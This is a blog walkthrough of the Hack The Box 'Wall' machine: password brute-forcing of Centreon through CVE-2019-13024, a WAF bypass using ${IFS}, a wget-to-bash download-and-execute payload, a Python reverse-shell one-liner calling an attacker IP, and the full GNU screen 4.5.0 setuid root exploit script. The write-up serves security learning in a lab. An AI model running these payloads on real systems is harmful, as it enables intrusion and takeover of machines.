---
layout:     post
title:      HacktheBox Writeup - Wall - padraignix.github.io 
title2:     Hack the Box - Wall
date:       2019-12-18 12:00:00 -0400
summary:    HTB Wall machine walkthrough. An easy Linux machine from HTB that focused on RCE WAF bypass to establish an initial foothold then a direct pivot to root using a vulnerable suid binary.
categories: hack-the-box
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,writeup,walkthrough,wall,python,waf,web application firewall,suid
thumbnail:  https://padraignix.github.io/assets/htb-wall/infocard.PNG
canon:      https://padraignix.github.io/hack-the-box/2019/12/18/htb-machine-wall/
tags:
 - htb 
 - walkthrough
 - writeup
 - python
 - waf
 - suid
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-wall/infocard.PNG' | relative_url }}">
</p>

<p>Wall was an easy Linux machine from HTB that focused on <code>RCE</code>/<code>WAF</code> bypass to establish an initial foothold then a direct pivot to root using a vulnerable <code>suid</code> binary. Let's follow along with my walkthrough. </p>

<h1>Initial Recon</h1>

<p>Per usual I start off with enumerating the machine using NMAP.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB# nmap -sC -sV 10.10.10.157
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 13:17 EDT
Nmap scan report for 10.10.10.157
Host is up (0.022s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp filtered http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.20 seconds
{% endhighlight %}

<p>The web service index page only showed a default Apache page. Ran <code>dirb</code> a few times to see if we could enumerate anything further.</p>

<p align="center">
<img src="{{ '/assets/htb-wall/recon-dirb.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-wall/recon-dirb-php.PNG' | relative_url }}">
</p>

<p>The <code>monitoring</code> was protected by basic auth. This seemed like an interesting avenue, however no amount of brute forcing was successful. After a bit of struggling tried changing the request from a <code>GET</code> to a <code>POST</code> and it worked! Managed to capture a redirect through <code>Burp</code> to a <code>/centreon</code> page.</p>

<p align="center">
<img src="{{ '/assets/htb-wall/recon-monitoring.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-wall/recon-centreon.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-wall/recon-centreon2.PNG' | relative_url }}">
</p>

<p>Alright, so we have a product, and we have a version. A quick lookup at <a href="https://documentation.centreon.com/docs/centreon/en/19.04/installation/from_VM.html">Centreon documentation</a> tells us that the default credentials are <code>admin/centreon</code>. Unfortunately this wasn't the case - looks like someone did their due diligence and changed the default password! A little bit more research and managed to find that this version of <code>Centreon</code> should be vulnerable to <a href="https://www.cvedetails.com/cve/CVE-2019-13024/">CVE-2019-13024</a>. Based on the writeup and code <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">here</a> I used a stripped down version of the code to bruteforce the password by looking for the <code>csrf</code> token being returned by the exploit. The payload portion was commented out for this phase.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Wall# while read i; do echo $i; python centreon-exploit.py http://10.10.10.157/centreon admin $i; done < ~/Desktop/rockyou.txt 
...
<snip>
...
password1
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 5945037e366eaa485552d0503f86e3b9
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : 2b996d38c7dfe0c3b753f07f217e2ffd
[+] Injecting Done, triggering the payload
[+] Check your netcat listener !
{% endhighlight %}

<p>Excellent, we now have the proper credentials <code>admin/password1</code>. CVE-2019-13024 indicates the vulnerability is in <code>/main.get.php?p=60901</code>. Setting up a listener and executing the exploit with payload enabled unfortunately did not work. Looking further at the exploit code payload to attempt and understand more what is happening.</p>

{% highlight shell %}
# this value contains the payload , you can change it as you want
"nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
{% endhighlight %}

<p>I played around with different payloads and I was able to deduce that there was a <code>WAF</code> in place and interfering with the payload. With a little bit of trial and error the main thing I could figure out was that <code>spaces</code> were culprit. This was determined by modifying the exploit code to print out the result code of the <code>POST</code> request to <code>/main.get.php?p=60901</code> - a 403 return would indicate the payload was being detected by the <code>WAF</code>.</p>

<p align="center">
<img src="{{ '/assets/htb-wall/user-exploit2.PNG' | relative_url }}">
</p>

<p>Unfortunately, I was not able to get the exploit working through the script. I decided to tackle the exploit manually through the webpage. Logging in as <code>admin/password1</code> then navigating to <code>/main.get.php?p=60901</code> we can that the nagios_bin portion of the exploit translates to the "Monitoring Engine Binary". I tested a few different payloads without success however finally I was able to get a call to my machine to download and execute a payload.<p>

{% highlight shell %}
root@kali:/var/www/html# cat pyrev.txt
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.116",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

<p>With the following payload I was finally able to get a reverse shell established.</p>

{% highlight shell %}
wget${IFS}-qO-${IFS}http://10.10.14.116/pyrev.txt${IFS}|${IFS}bash;
{% endhighlight %}

<p align="center">
<img src="{{ '/assets/htb-wall/user-shell.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-wall/user-exploit-burp.PNG' | relative_url }}">
</p>

{% highlight shell %}
root@kali:~/Desktop/HTB# nc -lvnp 1337
Listening on [0.0.0.0] (family 2, port 1337)

Connection from 10.10.10.157 42836 received!
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
$ pwd
/usr/local/centreon/www
{% endhighlight %}

<h1>Root exploitation</h1>

<p>Unfortunately I was not able to retrieve the user flag as <code>www-data</code>. Popped over an enumeration script and started looking for pivot avenues. One particularly interesting result was <code>screen-4.5.0</code> which had suid set.</p>

{% highlight shell %}
...
[-] SUID files:
-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
-rwsr-xr-x 1 root root 64424 Mar 10  2017 /bin/ping
-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
...
{% endhighlight %}

<p>I poked around a bit to see if there were any low-hanging fruit for this privesc and sure enough managed to find a searchsploit exploit.</p>

<p align="center">
<img src="{{ '/assets/htb-wall/root-searchsploit.PNG' | relative_url }}">
</p>

{% highlight shell %}
cat 41154.sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 

echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
{% endhighlight %}

<p>Moved the script over to Wall and kicked it off to see if we can successfully privesc to root.</p>

<p align="center">
<img src="{{ '/assets/htb-wall/root-initialshell.PNG' | relative_url }}">
</p>

<p>And with that we had access to our root.txt flag and could easily step to the user.txt flag as well.</p>

<p align="center">
<img src="{{ '/assets/htb-wall/root-owned.PNG' | relative_url }}">
</p>

<h1>Extra fun</h1>

<p>Unfortunately as a result of the privesc exploit there were a lot of remnants left on the machine. As a final act made sure to clean up after myself not to ruin anyone else's experience that happened to stumble upon these.</p>

<p align="center">
<img src="{{ '/assets/htb-wall/root-cleanup.PNG' | relative_url }}">
</p>